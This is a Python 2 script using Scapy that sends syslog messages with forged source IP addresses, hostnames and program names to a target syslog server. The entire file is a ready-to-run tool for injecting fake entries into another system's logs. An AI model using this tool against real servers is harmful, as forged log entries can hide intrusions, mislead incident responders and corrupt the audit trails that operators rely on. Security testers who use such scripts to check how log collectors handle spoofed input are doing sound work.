#!/usr/bin/env python
"""
syslog_spoof.py -- sends spoofed syslog messages to a serve.
  by Daniel Roberson @dmfroberson July/2017

TODO:
 - syslog priority and facility via command line
 - quiet flag
 - Validate IP addresses
"""

import sys
import time
import random
import socket
import argparse
import syslog
import logging

# Squelch Scapy warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *


# Syslog priorities, 0 -> 6:
# LOG_EMERG, LOG_ALERT, LOG_CRIT, LOG_ERR, LOG_WARNING,
# LOG_NOTICE, LOG_INFO, LOG_DEBUG.

# Syslog facilities:
# LOG_KERN, LOG_USER, LOG_MAIL, LOG_DAEMON, LOG_AUTH, LOG_LPR,
# LOG_NEWS, LOG_UUCP, LOG_CRON, LOG_SYSLOG and LOG_LOCAL0 to LOG_LOCAL7.

def send_syslog(
        target, hostname, program, message,
        dport=514,
        source_ip=None,
        priority=syslog.LOG_INFO,
        facility=syslog.LOG_SYSLOG):
    """ send_syslog() -- Sends spoofed syslog messages.

    Args (required):
        target (str)    - IP address of syslog server.
        hostname (str)  - Hostname in the syslog message.
        program (str)   - Program name in the syslog message.
        message (str)   - The message.

    Args (optional):
        dport (int)     - Destination port of syslog server.
        source_ip (str) - IP address to spoof to.
        priority        - Syslog priority.
        facility        - Syslog facility.

    Returns:
        True on success
        False on failure
    """
    prival = priority | facility
    sport = random.randint(1025, 65535)

    # Use spoofed IP address
    if source_ip:
        syslog_message = \
            IP(src=source_ip, dst=target) / \
            UDP(dport=dport, sport=sport) / \
            Raw(load='<' + str(prival) + '>' + \
                time.strftime("%b %d %H:%M:%S ") + \
                hostname + " " + \
                program + \
                "[" + str(random.randint(1, 65535)) + "]: " + \
                message)

    # Use actual IP address
    else:
        syslog_message = \
            IP(dst=target) / \
            UDP(dport=dport, sport=sport) / \
            Raw(load='<' + str(prival) + '>' + \
                time.strftime("%b %d %H:%M:%S ") + \
                hostname + " " + \
                program + \
                "[" + str(random.randint(1, 65535)) + "]: " + \
                message)

    # Send the packet!
    try:
        send(syslog_message, verbose=0)
    except socket.error, err:
        print "[-] Error sending packet: %s" % err
        return False

    return True


def main():
    """ main() -- entry point of program
    """
    description = \
        "example: ./syslog_spoof.py -t 192.168.10.10 -n scruffy " + \
        "-p syslog-ng -m \"rompty romp through the forest I go\""
    parser = argparse.ArgumentParser(description=description)
    parser.add_argument("-t",
                        "--target",
                        required=True,
                        help="Target syslog server")
    parser.add_argument("-n",
                        "--hostname",
                        required=True,
                        help="Spoofed hostname")
    parser.add_argument("-p",
                        "--progname",
                        required=True,
                        help="Spoofed program name")
    parser.add_argument("-m",
                        "--message",
                        required=True,
                        help="Contents of syslog entry message")
    parser.add_argument("-s",
                        "--source",
                        required=False,
                        help="Source IP to spoof syslog packets")
    parser.add_argument("-f",
                        "--facility",
                        required=False,
                        help="Syslog facility. Not implemented yet!")
    parser.add_argument("-r",
                        "--priority",
                        required=False,
                        help="Syslog priority. Not implemented yet!")

    args = parser.parse_args()

    print "[+] Sending spoofed syslog packet to %s" % args.target
    send_syslog(args.target, args.hostname, args.progname, args.message,
                source_ip=args.source)
                        
    
if __name__ == "__main__":
    main()


